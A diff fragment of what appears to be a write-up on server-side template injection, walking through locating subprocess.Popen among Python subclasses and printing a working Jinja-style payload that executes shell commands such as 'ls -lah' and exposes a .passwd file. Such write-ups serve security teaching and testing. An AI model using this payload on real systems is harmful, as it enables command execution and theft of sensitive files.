@@ -26,6 +26,7 @@ Output of the above payload provides us with all classes. We then copied them in
 sed 's/\\,/\\n/g' list.txt > new_list.txt
 cat -n new_list.txt | grep object
 
+
 This helped us identify subprocess.Popen() at index 408.
 
 Step 2: Executing Commands:
@@ -33,6 +34,7 @@ To execute commands such as ls -lah and view all files, including hidden ones, w
 
 
 {{ ''.__class__.__mro__[1].__subclasses__()[408]("ls -lah", shell=True, stdout=-1).communicate() }}
+
 
 Executing this payload returned the contents of the .passwd file, revealing sensitive information.
 
